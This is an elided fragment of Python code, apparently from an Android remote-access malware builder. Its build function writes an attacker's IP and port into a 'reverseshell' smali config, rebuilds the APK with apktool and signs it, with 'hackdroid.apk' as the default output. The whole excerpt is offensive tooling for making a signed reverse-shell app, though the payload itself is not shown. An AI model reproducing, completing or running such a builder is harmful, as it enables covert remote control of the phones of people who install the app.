...
def build(ip,port,output,ngrok=False,ng=None,icon=None):
    editor = "main"+direc+"Compiled_apk"+direc+"smali"+direc+"com"+direc+"example"+direc+"reverseshell2"+direc+"config.smali"
    try:
    ...
    outFileName = output if output else "hackdroid.apk"
    que = queue.Queue()
    t = threading.Thread(target=executeCMD,args=["java -jar main/Jar_utils/apktool.jar b main/Compiled_apk  -o "+outFileName,que],)
    t.start()
    ...
    if not resOut.returncode:
        ...
        t = threading.Thread(target=executeCMD,args=["java -jar main/Jar_utils/sign.jar -a "+outFileName+" --overwrite",que],)
        t.start()
